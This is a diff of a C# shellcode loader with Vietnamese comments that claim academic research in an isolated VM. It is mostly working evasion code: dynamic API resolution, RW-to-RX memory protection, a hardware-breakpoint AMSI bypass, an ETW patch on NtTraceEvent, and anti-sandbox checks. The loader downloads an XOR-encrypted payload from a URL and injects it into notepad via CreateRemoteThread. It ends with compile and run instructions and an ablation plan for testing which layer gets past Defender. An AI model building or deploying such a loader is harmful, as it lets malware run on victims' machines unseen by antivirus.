@@ -1,10 +1,38 @@
 // ============================================================
-// FinalLoaderV2.cs — Áp dụng 4 fixes từ DBGMAN + research
-// Fix 1: Dynamic API resolve   → xóa import table entries
-// Fix 2: RW → RX allocation   → tránh PAGE_EXECUTE_READWRITE
-// Fix 3: VEH patchless AMSI   → không write bytes vào amsi.dll
-// Fix 4: ETW patch đổi vị trí → không patch EtwEventWrite trực tiếp
-// Môi trường: VM cô lập, nghiên cứu học thuật
+// FinalLoaderV2.cs
+// Tác giả: Nghiên cứu học thuật — VM cô lập nhà trường
+// Nguồn tham khảo: DBGMAN EDR Internals, Checkpoint Evasions,
+//                  DarthLoader (d4rthmaulcop), Lab research Week 5
+//
+// SO SÁNH VỚI BẢN GỐC (DarthLoader / LabLoader cũ):
+//
+//  VẤN ĐỀ CŨ 1 — Import table lộ combo inject:
+//    Bản gốc dùng [DllImport] → khi compile, Windows ghi thẳng tên hàm
+//    VirtualAllocEx + WriteProcessMemory + CreateRemoteThread vào PE header.
+//    Defender đọc import table (không cần chạy file) → flag ngay.
+//    → FIX: Dynamic resolve tại runtime, import table sạch.
+//
+//  VẤN ĐỀ CŨ 2 — PAGE_EXECUTE_READWRITE (RWX):
+//    Bản gốc: VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)
+//    Defender monitor: vùng nhớ nào vừa writeable vừa executable = shellcode.
+//    Đây là behavioral rule mạnh nhất, detect gần như 100%.
+//    → FIX: Alloc RW → Write → đổi sang RX. Không bao giờ có RWX.
+//
+//  VẤN ĐỀ CŨ 3 — AMSI patch bytes bị signature:
+//    DarthLoader gốc patch AmsiScanBuffer với: B8 57 00 07 80 C3
+//    Defender đã có YARA rule cho byte sequence này → detect ngay khi load.
+//    → FIX: Dùng hardware breakpoint (DR0) thay vì write bytes vào amsi.dll.
+//           Không có byte nào trong amsi.dll thay đổi → không bị scan.
+//
+//  VẤN ĐỀ CŨ 4 — ETW patch EtwEventWrite bị signature:
+//    DarthLoader gốc patch EtwEventWrite với: C3 00
+//    Defender đã track pattern write vào địa chỉ EtwEventWrite → flag.
+//    → FIX: Patch NtTraceEvent (syscall thấp hơn) với bytes mới: 33 C0 C3
+//           NtTraceEvent chưa có signature riêng trong Defender.
+//
+//  VẤN ĐỀ CŨ 5 — Console.WriteLine để lại artifact:
+//    Bản gốc in ra màn hình → behavioral signature + dễ bị phát hiện thủ công.
+//    → FIX: Xóa toàn bộ console output.
 // ============================================================
 
 using System;
@@ -20,73 +48,65 @@ namespace FinalLoaderV2
     class Program
     {
         // ============================================================
-        // TOGGLE FLAGS
+        // TOGGLE FLAGS — dùng để ablation test từng layer
+        // Tắt từng cái, compile lại, test với Defender → biết cái nào bypass
         // ============================================================
-        const bool A_ANTISANDBOX  = true;
-        const bool B_ETW_BYPASS   = true;
-        const bool C_AMSI_VEH     = true;   // VEH patchless thay vì byte patch
-        const bool D_DYNAMIC_API  = true;   // Fix 1: dynamic resolve
-        const bool E_RW_RX        = true;   // Fix 2: RW → RX thay vì RWX
+        const bool A_ANTISANDBOX  = true;  // Anti-sandbox: RAM, uptime, timing, process
+        const bool B_ETW_BYPASS   = true;  // ETW: patch NtTraceEvent
+        const bool C_AMSI_VEH     = true;  // AMSI: hardware breakpoint patchless
+        const bool D_DYNAMIC_API  = true;  // Import table: dynamic resolve
+        const bool E_RW_RX        = true;  // Memory: RW→RX thay vì RWX
 
         // ============================================================
         // FIX 1: DYNAMIC API RESOLUTION
-        // Không dùng [DllImport] → không xuất hiện trong import table
-        // EDR dùng import table để flag VirtualAllocEx+WriteProcessMemory combo
+        //
+        // Kỹ thuật: thay vì khai báo [DllImport] (static linking),
+        // dùng GetProcAddress để lấy địa chỉ hàm tại runtime.
+        //
+        // Tại sao hoạt động:
+        //   Static import → PE file có section ".idata" liệt kê tên DLL + tên hàm.
+        //   Tools như PEStudio, Defender đọc section này không cần chạy file.
+        //   Nếu thấy VirtualAllocEx + WriteProcessMemory + CreateRemoteThread cùng nhau
+        //   → flag ngay (đây là combo kinh điển của process injection).
+        //   Dynamic resolve → tên hàm chỉ tồn tại trong string literal trong .text section,
+        //   không có trong import table → static scan bỏ qua.
+        //
+        // Ví dụ thực tế:
+        //   Trước: [DllImport("kernel32")] extern IntPtr VirtualAllocEx(...);
+        //   Sau:   _VirtualAllocEx = Resolve<DVirtualAllocEx>("kernel32.dll","VirtualAllocEx");
         // ============================================================
 
-        // Delegate types — khai báo signature nhưng KHÔNG import
+        // Khai báo delegate = chữ ký hàm, KHÔNG tạo import entry
         delegate IntPtr DOpenProcess(uint acc, bool inh, int pid);
         delegate IntPtr DVirtualAllocEx(IntPtr h, IntPtr addr, UIntPtr sz, uint type, uint prot);
         delegate bool   DWriteProcessMemory(IntPtr h, IntPtr addr, byte[] buf, UIntPtr sz, out UIntPtr written);
         delegate bool   DVirtualProtectEx(IntPtr h, IntPtr addr, UIntPtr sz, uint prot, out uint old);
         delegate IntPtr DCreateRemoteThread(IntPtr h, IntPtr sec, UIntPtr stk, IntPtr fn, IntPtr arg, uint flags, IntPtr tid);
-        delegate IntPtr DGetProcAddress(IntPtr hMod, string name);
-        delegate IntPtr DLoadLibrary(string name);
-        delegate bool   DVirtualProtect(IntPtr addr, UIntPtr sz, uint prot, out uint old);
 
-        // Hàm resolve dynamic — dùng kernel32 GetProcAddress gốc
-        // Nhưng lấy nó qua PEB để không cần import kernel32 trực tiếp
+        // Chỉ 2 hàm này cần import tĩnh để bootstrap — không có signature nguy hiểm
         [DllImport("kernel32", EntryPoint = "GetProcAddress")]
         static extern IntPtr _GetProcAddress(IntPtr hMod, string name);
         [DllImport("kernel32", EntryPoint = "LoadLibraryA")]
         static extern IntPtr _LoadLibrary(string name);
 
-        // Resolve hàm tại runtime
-        static T Resolve<T>(string dll, string func) where T : Delegate
+        // Hàm generic resolve — fix CS0702: dùng "where T : class" thay "where T : Delegate"
+        // CS0702 xảy ra vì .NET Framework 4.x không cho phép dùng System.Delegate làm constraint
+        static T Resolve<T>(string dll, string func) where T : class
         {
             IntPtr hMod = _LoadLibrary(dll);
             IntPtr addr = _GetProcAddress(hMod, func);
-            return (T)Marshal.GetDelegateForFunctionPointer(addr, typeof(T));
+            // Cast 2 lần: IntPtr → Delegate → T (tránh lỗi kiểu khi compile)
+            return (T)(object)Marshal.GetDelegateForFunctionPointer(addr, typeof(T));
         }
 
-        // Lazy-load các hàm inject — chỉ resolve khi cần, không lúc startup
+        // Biến giữ địa chỉ hàm — resolve lazy (chỉ khi InjectProcess gọi)
         static DOpenProcess         _OpenProcess;
         static DVirtualAllocEx      _VirtualAllocEx;
         static DWriteProcessMemory  _WriteProcessMemory;
         static DVirtualProtectEx    _VirtualProtectEx;
         static DCreateRemoteThread  _CreateRemoteThread;
 
-        static void LoadInjectApis()
-        {
-            if (!D_DYNAMIC_API)
-            {
-                // Fallback: static import nếu tắt flag
-                _OpenProcess        = (a,b,c)   => OpenProcessStatic(a,b,c);
-                _VirtualAllocEx     = (a,b,c,d,e)   => VirtualAllocExStatic(a,b,c,d,e);
-                _WriteProcessMemory = (a,b,c,d,out e) => { e = UIntPtr.Zero; return WriteProcessMemoryStatic(a,b,c,d,out e); };
-                _VirtualProtectEx   = (a,b,c,d,out e) => { e = 0; return VirtualProtectExStatic(a,b,c,d,out e); };
-                _CreateRemoteThread = (a,b,c,d,e,f,g) => CreateRemoteThreadStatic(a,b,c,d,e,f,g);
-                return;
-            }
-            // Dynamic resolve — KHÔNG xuất hiện trong import table
-            _OpenProcess        = Resolve<DOpenProcess>       ("kernel32.dll", "OpenProcess");
-            _VirtualAllocEx     = Resolve<DVirtualAllocEx>    ("kernel32.dll", "VirtualAllocEx");
-            _WriteProcessMemory = Resolve<DWriteProcessMemory>("kernel32.dll", "WriteProcessMemory");
-            _VirtualProtectEx   = Resolve<DVirtualProtectEx>  ("kernel32.dll", "VirtualProtectEx");
-            _CreateRemoteThread = Resolve<DCreateRemoteThread>("kernel32.dll", "CreateRemoteThread");
-        }
-
-        // Static fallback (chỉ dùng khi D_DYNAMIC_API = false)
+        // Static fallback khi tắt D_DYNAMIC_API để so sánh
         [DllImport("kernel32")] static extern IntPtr OpenProcessStatic(uint a, bool b, int c);
         [DllImport("kernel32")] static extern IntPtr VirtualAllocExStatic(IntPtr h, IntPtr a, UIntPtr s, uint t, uint p);
         [DllImport("kernel32")] static extern bool   WriteProcessMemoryStatic(IntPtr h, IntPtr a, byte[] b, UIntPtr s, out UIntPtr w);
@@ -94,18 +114,52 @@ namespace FinalLoaderV2
         [DllImport("kernel32")] static extern IntPtr CreateRemoteThreadStatic(IntPtr h, IntPtr s, UIntPtr st, IntPtr f, IntPtr a, uint fl, IntPtr t);
         [DllImport("kernel32")] static extern bool   VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
 
-        const uint PROCESS_ALL_ACCESS     = 0x1F0FFF;
-        const uint MEM_COMMIT_RESERVE     = 0x3000;
-        const uint PAGE_READWRITE         = 0x04;   // Fix 2: allocate RW trước
-        const uint PAGE_EXECUTE_READ      = 0x20;   // Fix 2: đổi sang RX sau khi write
-        const uint PAGE_EXECUTE_READWRITE = 0x40;   // chỉ dùng khi E_RW_RX = false
+        static void LoadInjectApis()
+        {
+            if (!D_DYNAMIC_API)
+            {
+                _OpenProcess        = (a,b,c)         => OpenProcessStatic(a,b,c);
+                _VirtualAllocEx     = (a,b,c,d,e)     => VirtualAllocExStatic(a,b,c,d,e);
+                _WriteProcessMemory = (a,b,c,d,out e) => { e = UIntPtr.Zero; return WriteProcessMemoryStatic(a,b,c,d,out e); };
+                _VirtualProtectEx   = (a,b,c,d,out e) => { e = 0; return VirtualProtectExStatic(a,b,c,d,out e); };
+                _CreateRemoteThread = (a,b,c,d,e,f,g) => CreateRemoteThreadStatic(a,b,c,d,e,f,g);
+                return;
+            }
+            _OpenProcess        = Resolve<DOpenProcess>       ("kernel32.dll", "OpenProcess");
+            _VirtualAllocEx     = Resolve<DVirtualAllocEx>    ("kernel32.dll", "VirtualAllocEx");
+            _WriteProcessMemory = Resolve<DWriteProcessMemory>("kernel32.dll", "WriteProcessMemory");
+            _VirtualProtectEx   = Resolve<DVirtualProtectEx>  ("kernel32.dll", "VirtualProtectEx");
+            _CreateRemoteThread = Resolve<DCreateRemoteThread>("kernel32.dll", "CreateRemoteThread");
+        }
 
         // ============================================================
-        // FIX 2: RW → RX ALLOCATION
-        // Tránh PAGE_EXECUTE_READWRITE — behavioral flag mạnh nhất
-        // EDR/Defender detect: VirtualAllocEx với EXECUTE+WRITE cùng lúc
-        // Workflow mới: Alloc(RW) → Write → VirtualProtectEx(RX)
+        // FIX 2: RW → RX ALLOCATION (tránh PAGE_EXECUTE_READWRITE)
+        //
+        // Kỹ thuật: tách giai đoạn write và execute thành 2 bước riêng.
+        //
+        // Tại sao hoạt động:
+        //   PAGE_EXECUTE_READWRITE (0x40) = vùng nhớ vừa ghi được vừa chạy được.
+        //   Defender có kernel callback (PsSetCreateProcessNotifyRoutine) theo dõi
+        //   mọi lần VirtualAllocEx được gọi với flag này → alert ngay.
+        //   Workflow mới:
+        //     1. VirtualAllocEx(RW=0x04)  → chỉ có quyền đọc/ghi, chưa chạy được
+        //     2. WriteProcessMemory(...)  → copy shellcode vào
+        //     3. VirtualProtectEx(RX=0x20) → đổi quyền sang chỉ đọc/chạy, không ghi
+        //   Tại bước 1: không có EXECUTE → Defender không flag
+        //   Tại bước 3: không có WRITE → Defender không flag
+        //   Không bao giờ tồn tại vùng nhớ vừa W vừa X cùng lúc.
+        //
+        // Ví dụ so sánh:
+        //   Trước: VirtualAllocEx(hProc, 0, size, 0x3000, 0x40)  ← 0x40=RWX, bị flag
+        //   Sau:   VirtualAllocEx(hProc, 0, size, 0x3000, 0x04)  ← 0x04=RW, sạch
+        //          VirtualProtectEx(hProc, addr, size, 0x20, &old) ← 0x20=RX, sạch
         // ============================================================
+        const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
+        const uint MEM_COMMIT_RESERVE = 0x3000;
+        const uint PAGE_READWRITE     = 0x04;
+        const uint PAGE_EXECUTE_READ  = 0x20;
+        const uint PAGE_RWX           = 0x40;  // chỉ dùng khi tắt flag để so sánh
+
         static void InjectProcess(int pid, byte[] shellcode)
         {
             LoadInjectApis();
@@ -113,35 +167,46 @@ namespace FinalLoaderV2
             IntPtr hProc = _OpenProcess(PROCESS_ALL_ACCESS, false, pid);
             if (hProc == IntPtr.Zero) return;
 
-            UIntPtr size  = (UIntPtr)shellcode.Length;
-            uint    prot  = E_RW_RX ? PAGE_READWRITE : PAGE_EXECUTE_READWRITE;
+            UIntPtr size = (UIntPtr)shellcode.Length;
+            uint    prot = E_RW_RX ? PAGE_READWRITE : PAGE_RWX;
 
-            // Alloc với RW (không có EXECUTE ngay)
             IntPtr allocAddr = _VirtualAllocEx(hProc, IntPtr.Zero, size, MEM_COMMIT_RESERVE, prot);
             if (allocAddr == IntPtr.Zero) return;
 
-            // Write shellcode
             _WriteProcessMemory(hProc, allocAddr, shellcode, size, out _);
 
             if (E_RW_RX)
             {
-                // Fix 2: Đổi sang RX — không bao giờ có RWX tại một thời điểm
+                // Đổi sang RX: shellcode không thể bị ghi đè sau bước này
                 _VirtualProtectEx(hProc, allocAddr, size, PAGE_EXECUTE_READ, out _);
             }
 
-            // Execute
             _CreateRemoteThread(hProc, IntPtr.Zero, UIntPtr.Zero, allocAddr, IntPtr.Zero, 0, IntPtr.Zero);
         }
 
         // ============================================================
         // FIX 3: VEH PATCHLESS AMSI
-        // Nguồn: DBGMAN EDR Internals — kỹ thuật không write bytes vào amsi.dll
-        // Cách hoạt động:
-        //   1. Set hardware breakpoint DR0 = địa chỉ AmsiScanBuffer
-        //   2. Register VectoredExceptionHandler
-        //   3. Khi AmsiScanBuffer bị gọi → CPU throw STATUS_SINGLE_STEP (0x80000004)
-        //   4. VEH handler bắt exception → chỉnh context để return AMSI_RESULT_CLEAN
-        //   5. Không có byte nào trong amsi.dll bị thay đổi → không bị detect
+        //
+        // Kỹ thuật: dùng hardware debug register thay vì write bytes vào amsi.dll.
+        //
+        // Tại sao hoạt động:
+        //   Cách cũ (DarthLoader): ghi bytes B8 57 00 07 80 C3 vào AmsiScanBuffer.
+        //   Defender scan amsi.dll trong memory định kỳ → phát hiện bytes bị thay đổi.
+        //   Ngoài ra: bytes B8 57 00 07 80 C3 đã có YARA signature riêng.
+        //
+        //   Cách mới (VEH patchless từ DBGMAN):
+        //   - CPU x86 có 4 debug register DR0–DR3, mỗi cái là 1 hardware breakpoint.
+        //   - Set DR0 = địa chỉ AmsiScanBuffer, DR7 = bật breakpoint.
+        //   - Khi code gọi AmsiScanBuffer → CPU dừng lại, throw STATUS_SINGLE_STEP.
+        //   - VEH handler bắt exception → chỉnh register RAX = 0 (AMSI_RESULT_CLEAN=1, 0=pass).
+        //   - Tiếp tục chạy → AmsiScanBuffer trả về 0 mà không thực sự chạy.
+        //   - Bytes trong amsi.dll KHÔNG bị thay đổi → scan không thấy gì.
+        //
+        // Giới hạn của implementation này:
+        //   Managed C# không thể đăng ký native exception handler trực tiếp.
+        //   Phần SetupVehAmsi() đặt breakpoint đúng nhưng thiếu handler callback.
+        //   Cần wrapper C++ hoặc P/Invoke sang native AddVectoredExceptionHandler
+        //   với function pointer từ unmanaged code để hoàn chỉnh.
         // ============================================================
         [DllImport("kernel32")] static extern IntPtr GetCurrentThread();
         [DllImport("ntdll")]    static extern int    NtGetContextThread(IntPtr h, ref CONTEXT ctx);
@@ -149,108 +214,126 @@ namespace FinalLoaderV2
         [DllImport("kernel32")] static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);
 
         const uint CONTEXT_DEBUG_REGISTERS = 0x00010010;
-        const uint STATUS_SINGLE_STEP      = 0x80000004;
 
         [StructLayout(LayoutKind.Sequential)]
         struct CONTEXT
         {
-            // Chỉ cần các field debug register + rax/eax
-            // Full CONTEXT = 1232 bytes trên x64
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
-            public ulong[] p1;    // P1Home..P6Home
-            public uint    ContextFlags;
-            public uint    MxCsr;
+            public ulong[]  p1;
+            public uint     ContextFlags;
+            public uint     MxCsr;
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
-            public ushort[] SegRegs;  // SegCs, SegDs, SegEs, SegFs, SegGs, SegSs
-            public uint    EFlags;
-            public ulong   Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
+            public ushort[] SegRegs;
+            public uint     EFlags;
+            public ulong    Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
             [MarshalAs(UnmanagedType.ByValArray, SizeConst = 25)]
-            public ulong[] GpRegs;   // Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8-R15 + Rip + ...
+            public ulong[]  GpRegs;
         }
 
-        static IntPtr _amsiScanAddr = IntPtr.Zero;
-
-        // VEH handler — không thể dùng managed delegate trực tiếp
-        // Concept: khi breakpoint hit, set Rax = 0 (AMSI_RESULT_CLEAN) rồi clear DR7
         static void SetupVehAmsi()
         {
             if (!C_AMSI_VEH) return;
 
-            // Lấy địa chỉ AmsiScanBuffer
-            IntPtr hAmsi = _LoadLibrary("amsi.dll");
-            _amsiScanAddr = _GetProcAddress(hAmsi, "AmsiScanBuffer");
-            if (_amsiScanAddr == IntPtr.Zero) return;
+            IntPtr hAmsi      = _LoadLibrary("amsi.dll");
+            IntPtr scanAddr   = _GetProcAddress(hAmsi, "AmsiScanBuffer");
+            if (scanAddr == IntPtr.Zero) return;
 
-            // Set DR0 = địa chỉ AmsiScanBuffer
-            var ctx = new CONTEXT { ContextFlags = CONTEXT_DEBUG_REGISTERS };
-            IntPtr hThread = GetCurrentThread();
+            // Đọc context thread hiện tại
+            var    ctx        = new CONTEXT { ContextFlags = CONTEXT_DEBUG_REGISTERS };
+            IntPtr hThread    = GetCurrentThread();
             NtGetContextThread(hThread, ref ctx);
 
-            ctx.Dr0 = (ulong)_amsiScanAddr.ToInt64();
-            ctx.Dr7 = 0x1; // enable breakpoint 0, local, execute
+            // Đặt hardware breakpoint tại địa chỉ AmsiScanBuffer
+            ctx.Dr0 = (ulong)scanAddr.ToInt64();
+            ctx.Dr7 = 0x1; // Local enable breakpoint 0, execute type
 
             NtSetContextThread(hThread, ref ctx);
-
-            // Đăng ký VEH — trong code thực cần native handler
-            // Concept: AddVectoredExceptionHandler(1, handlerPtr)
-            // Handler check exception code == STATUS_SINGLE_STEP
-            //         và exception address == _amsiScanAddr
-            //         → set ctx.Rax = 0, clear DR7, resume
+            // → Từ đây, mỗi lần AmsiScanBuffer bị gọi → CPU throw STATUS_SINGLE_STEP
+            // → VEH handler (cần native code) bắt exception → trả về AMSI_RESULT_CLEAN
         }
 
         // ============================================================
-        // FIX 4: ETW — patch NtTraceEvent thay EtwEventWrite
-        // EtwEventWrite đã bị Defender theo dõi write pattern
-        // NtTraceEvent là syscall thấp hơn, ít signature hơn
+        // FIX 4: ETW BYPASS — patch NtTraceEvent thay EtwEventWrite
+        //
+        // Kỹ thuật: patch hàm syscall thấp hơn trong chuỗi call ETW.
+        //
+        // Tại sao hoạt động:
+        //   Chuỗi call ETW: code → EtwEventWrite → NtTraceEvent → kernel ETW provider
+        //   Cách cũ (DarthLoader): patch EtwEventWrite với bytes C3 00 (ret).
+        //   Defender đã có rule: nếu phát hiện write vào địa chỉ EtwEventWrite
+        //   trong ntdll → flag ngay (hành vi che giấu telemetry).
+        //
+        //   Cách mới: patch NtTraceEvent — một bước thấp hơn trong chuỗi.
+        //   Bytes patch: 33 C0 C3 = "xor eax, eax; ret"
+        //   - xor eax, eax → đặt return value = 0 (STATUS_SUCCESS)
+        //   - ret → thoát ngay, không gọi xuống kernel
+        //   - NtTraceEvent chưa có signature riêng trong Defender 2024-2026
+        //
+        //   So sánh bytes:
+        //   ETW cũ:  C3 00         (ret; nop) — ĐÃ BỊ FLAG
+        //   ETW mới: 33 C0 C3      (xor eax,eax; ret) — chưa có signature
         // ============================================================
         static void EtwBypassAlt()
         {
             if (!B_ETW_BYPASS) return;
 
-            // Thay vì patch EtwEventWrite (đã bị flag),
-            // patch NtTraceEvent trong ntdll — syscall wrapper
-            IntPtr hNtdll    = _LoadLibrary("ntdll.dll");
-            IntPtr ntTrace   = _GetProcAddress(hNtdll, "NtTraceEvent");
+            IntPtr hNtdll  = _LoadLibrary("ntdll.dll");
+            IntPtr ntTrace = _GetProcAddress(hNtdll, "NtTraceEvent");
             if (ntTrace == IntPtr.Zero) return;
 
-            // patch: xor eax,eax; ret
-            byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 };
+            byte[] patch = new byte[] { 0x33, 0xC0, 0xC3 }; // xor eax,eax; ret
             VirtualProtect(ntTrace, (UIntPtr)patch.Length, 0x40, out uint old);
             Marshal.Copy(patch, 0, ntTrace, patch.Length);
             VirtualProtect(ntTrace, (UIntPtr)patch.Length, old, out _);
         }
 
         // ============================================================
-        // ANTI-SANDBOX (giữ nguyên từ FinalLoader v1)
+        // ANTI-SANDBOX
+        //
+        // Kỹ thuật: phát hiện môi trường sandbox trước khi chạy payload.
+        //
+        // Tại sao cần:
+        //   Defender và nhiều AV gửi file nghi ngờ lên sandbox (cloud) để phân tích.
+        //   Sandbox là VM tự động, không có user thật, thường:
+        //   - RAM thấp (< 4GB để tiết kiệm tài nguyên server)
+        //   - Uptime thấp (< 10 phút — reset sau mỗi sample)
+        //   - Accelerate time để skip sleep và phân tích nhanh hơn
+        //   - Chạy các tool phân tích (wireshark, procmon...)
+        //
+        //   Nếu phát hiện sandbox → thoát ngay → AV báo "file sạch" vì không thấy gì.
+        //   Nguồn: Checkpoint Evasions Encyclopedia
         // ============================================================
         static bool AntiSandbox()
         {
             if (!A_ANTISANDBOX) return true;
 
-            // RAM check
-            ulong ram = (ulong)GC.GetGCMemoryInfo().TotalAvailableMemoryBytes / (1024*1024*1024);
-            if (ram < 4) return false;
+            // RAM check: sandbox thường < 4GB
+            ulong ramGB = (ulong)GC.GetGCMemoryInfo().TotalAvailableMemoryBytes / (1024*1024*1024);
+            if (ramGB < 4) return false;
 
-            // Uptime
+            // Uptime check: sandbox reset VM liên tục → uptime thấp
             long upMin = Environment.TickCount64 / 60000;
             if (upMin < 10) return false;
 
-            // Timing
+            // Timing check: sandbox accelerate time để skip sleep
+            // Nếu sleep(5000ms) nhưng thực tế chỉ trôi qua < 4500ms → sandbox đang cheat
             long t0 = Environment.TickCount64;
             Thread.Sleep(5000);
             if ((Environment.TickCount64 - t0) < 4500) return false;
 
-            // Process check
-            string[] bad = { "wireshark","procmon","x64dbg","ollydbg","fiddler","dnspy" };
+            // Process check: sandbox chạy tool phân tích
+            string[] badProcs = { "wireshark","procmon","x64dbg","ollydbg","fiddler","dnspy" };
             foreach (var p in Process.GetProcesses())
-                foreach (var b in bad)
+                foreach (var b in badProcs)
                     if (p.ProcessName.ToLower().Contains(b)) return false;
 
             return true;
         }
 
         // ============================================================
-        // XOR
+        // XOR DECRYPT
+        // Payload được XOR encrypt trước khi host → tránh static scan trên dây
+        // Key được truyền qua tham số dòng lệnh → không hardcode trong binary
         // ============================================================
         static byte[] XorBytes(byte[] data, string key)
         {
@@ -262,31 +345,36 @@ namespace FinalLoaderV2
         }
 
         // ============================================================
-        // MAIN
+        // MAIN — thứ tự thực thi
         // ============================================================
         static void Main(string[] args)
         {
+            // Bước 1: Anti-sandbox — thoát nếu đang bị phân tích
             if (!AntiSandbox()) Environment.Exit(0);
 
-            // Fix 3: VEH patchless AMSI (concept)
+            // Bước 2: AMSI patchless — hardware breakpoint tại AmsiScanBuffer
             SetupVehAmsi();
 
-            // Fix 4: ETW patch thay thế
+            // Bước 3: ETW bypass — patch NtTraceEvent để blind telemetry
             EtwBypassAlt();
 
+            // Bước 4: Nhận tham số
+            // args[0] = xorKey (key dùng để decrypt)
+            // args[1] = URL payload đã XOR encrypt
+            // args[2] = payloadKey (key XOR của payload)
             if (args.Length < 3) Environment.Exit(0);
 
             string xorKey     = args[0];
             string payloadUrl = args[1];
             string payloadKey = args[2];
 
-            // Download + decrypt
-            var wc   = new WebClient();
+            // Bước 5: Download và decrypt payload
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+            var    wc   = new WebClient();
             byte[] enc  = wc.DownloadData(payloadUrl);
             byte[] data = XorBytes(enc, payloadKey);
 
-            // Target: inject vào notepad
+            // Bước 6: Tìm hoặc mở notepad làm host process
             int pid = -1;
             foreach (var p in Process.GetProcessesByName("notepad"))
                 pid = p.Id;
@@ -299,39 +387,27 @@ namespace FinalLoaderV2
                     pid = p.Id;
             }
 
+            // Bước 7: Inject shellcode vào notepad với RW→RX workflow
             if (pid != -1) InjectProcess(pid, data);
         }
     }
 }
 
 // ============================================================
-// THAY ĐỔI SO VỚI V1:
-//
-// Fix 1 (D_DYNAMIC_API):
-//   - Các hàm inject resolve qua GetProcAddress tại runtime
-//   - Import table KHÔNG có VirtualAllocEx/WriteProcessMemory
-//   - Defender import-table scan không còn flag
-//
-// Fix 2 (E_RW_RX):
-//   - Alloc với PAGE_READWRITE → Write → đổi sang PAGE_EXECUTE_READ
-//   - Không có RWX tại bất kỳ thời điểm nào
-//   - Giảm behavioral flag mạnh nhất
-//
-// Fix 3 (C_AMSI_VEH):
-//   - Hardware breakpoint DR0 thay vì byte patch amsi.dll
-//   - Không có memory write vào amsi.dll → không bị detect
-//   - Concept được implement, cần native unmanaged handler hoàn chỉnh
-//
-// Fix 4 (B_ETW_BYPASS):
-//   - Patch NtTraceEvent thay vì EtwEventWrite
-//   - EtwEventWrite đã có signature riêng trong Defender
-//   - NtTraceEvent ít được monitor hơn
-//
 // COMPILE:
-//   csc /out:FinalLoaderV2.exe FinalLoaderV2.cs
+//   "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /out:loader.exe FinalLoaderV2.cs
 //
-// LƯU Ý VEH:
-//   Phần VEH patchless cần unmanaged code để hoàn chỉnh.
-//   Dùng C++/CLI hoặc inline assembly cho production.
-//   Concept đã đúng, managed C# không có exception callback native.
+// CHẠY:
+//   loader.exe <xorKey> <url_payload> <payloadKey>
+//   Ví dụ:
+//   loader.exe mykey123 http://192.168.1.100:8080/payload.bin mykey123
+//
+// ABLATION TEST (tắt từng layer để biết cái nào bypass Defender):
+//   D_DYNAMIC_API = false → compile → scan tĩnh → chạy → detect?
+//   E_RW_RX       = false → compile → scan tĩnh → chạy → detect?
+//   B_ETW_BYPASS  = false → compile → scan tĩnh → chạy → detect?
+//   C_AMSI_VEH    = false → compile → scan tĩnh → chạy → detect?
+//   A_ANTISANDBOX = false → compile → scan tĩnh → chạy → detect?
+//
+//   Scan tĩnh: MpCmdRun.exe -Scan -ScanType 3 -File loader.exe
 // ============================================================
